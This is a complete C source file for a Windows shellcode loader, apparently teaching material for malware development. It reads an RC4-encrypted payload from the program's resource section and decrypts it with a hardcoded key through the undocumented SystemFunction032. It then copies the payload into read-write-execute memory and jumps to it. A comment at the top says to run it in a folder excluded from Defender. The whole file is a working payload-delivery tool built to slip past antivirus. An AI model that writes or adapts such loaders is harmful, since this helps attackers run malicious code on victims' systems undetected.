// Run this script in a folder exceptioned by Defender.
#include <stdio.h>
#include <Windows.h>
#include "resource.h"

typedef struct
{
	DWORD	Length;
	DWORD	MaximumLength;
	PVOID	Buffer;

} USTRING;


typedef NTSTATUS(NTAPI* fnSystemFunction032)(
	struct USTRING* Data,
	struct USTRING* Key
	);

/*
Helper function that calls SystemFunction032
* pRc4Key - The RC4 key use to encrypt/decrypt
* pPayloadData - The base address of the buffer to encrypt/decrypt
* dwRc4KeySize - Size of pRc4key (Param 1)
* sPayloadSize - Size of pPayloadData (Param 2)
*/
BOOL Rc4EncryptionViaSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize) {

	NTSTATUS STATUS = NULL;

	USTRING Data = {
		.Buffer = pPayloadData,
		.Length = sPayloadSize,
		.MaximumLength = sPayloadSize
	};

	USTRING	Key = {
		.Buffer = pRc4Key,
		.Length = dwRc4KeySize,
		.MaximumLength = dwRc4KeySize
	};

	fnSystemFunction032 SystemFunction032 = (fnSystemFunction032)GetProcAddress(LoadLibraryA("Advapi32"), "SystemFunction032");

	if ((STATUS = SystemFunction032(&Data, &Key)) != 0x0) {
		printf("[!] SystemFunction032 FAILED With Error: 0x%0.8X \n", STATUS);
		return FALSE;
	}

	return TRUE;
}

unsigned char key[] = {
	's', '3', 'C', 'r', 'e', 'T', 'K', '3', 'y' , '!'
};


int main() {

	HRSRC		hRsrc = NULL;
	HGLOBAL		hGlobal = NULL;
	PVOID		pPayloadAddress = NULL;
	SIZE_T		sPayloadSize = NULL;


	// Get the location to the data stored in .rsrc by its id *IDR_RCDATA1*
	hRsrc = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_RCDATA1), RT_RCDATA);
	if (hRsrc == NULL) {
		// in case of function failure 
		printf("[!] FindResourceW Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get HGLOBAL, or the handle of the specified resource data since its required to call LockResource later
	hGlobal = LoadResource(NULL, hRsrc);
	if (hGlobal == NULL) {
		// in case of function failure 
		printf("[!] LoadResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get the address of our payload in .rsrc section
	pPayloadAddress = LockResource(hGlobal);
	if (pPayloadAddress == NULL) {
		// in case of function failure 
		printf("[!] LockResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Get the size of our payload in .rsrc section
	sPayloadSize = SizeofResource(NULL, hRsrc);
	if (sPayloadSize == NULL) {
		// in case of function failure 
		printf("[!] SizeofResource Failed With Error : %d \n", GetLastError());
		return -1;
	}

	// Printing pointer and size to the screen
	printf("[i] Base Address of Allocated Memory for Encrypted Shellcode : 0x%p \n", pPayloadAddress);

	// Allocating memory buffer to modify rsrc encrypted payload using VirtualAlloc call
	PVOID pPayload = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (pPayload != NULL) {
		// copying the payload from resource section to the new buffer 
		memcpy(pPayload, pPayloadAddress, sPayloadSize);
	}
	else {
		// Error handling
		printf("[!] VirtualAlloc failed with error : %d \n", GetLastError());
		return -1;
	}

	// Printing the base address of our temporary buffer
	printf("[i] Base Address of Allocated Memory for Decrypted Shellcode : 0x%p \n", pPayload);
	printf("Decrypting shellcode...\n");

	DWORD dPayloadSize = (DWORD)sPayloadSize;
	DWORD keySize = (DWORD)sizeof(key);
	
	BOOL DecryptResult = Rc4EncryptionViaSystemFunc032(key, pPayload, keySize, dPayloadSize);

	if (DecryptResult) {
		// Encryption/Decryption was successful
		printf("Decryption was successful.\n");
	}
	else {
		// Encryption/Decryption failed
		printf("Decryption failed.\n");
		exit(1);
	}

	// Declare a function pointer type that matches the shellcode signature
	typedef void (*ShellcodeFunction)();

	// Cast the executable buffer as a function pointer
	ShellcodeFunction shellcodeFunc = (ShellcodeFunction)pPayload;

	// Call the shellcode function
	shellcodeFunc();

	// Free the executable buffer
	VirtualFree(pPayload, 0, MEM_RELEASE);

	return 0;
}
